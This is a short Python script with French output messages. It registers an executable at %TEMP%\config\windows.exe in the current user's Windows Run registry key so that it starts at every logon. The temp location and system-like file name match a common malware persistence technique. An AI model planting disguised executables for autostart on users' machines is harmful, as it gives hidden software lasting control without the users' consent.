import os
import sys
import winreg as reg
import shutil

file_path = os.path.join(os.getenv('TEMP'), 'config', 'windows.exe')

if os.path.exists(file_path):
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE)

        reg.SetValueEx(reg_key, 'MonFichierAuDémarrage', 0, reg.REG_SZ, file_path)
        reg.CloseKey(reg_key)

        print(f"Le fichier {file_path} a été ajouté au démarrage.")
    except Exception as e:
        print(f"Erreur lors de l'ajout au registre : {e}")
else:
    print(f"Le fichier {file_path} n'existe pas.")

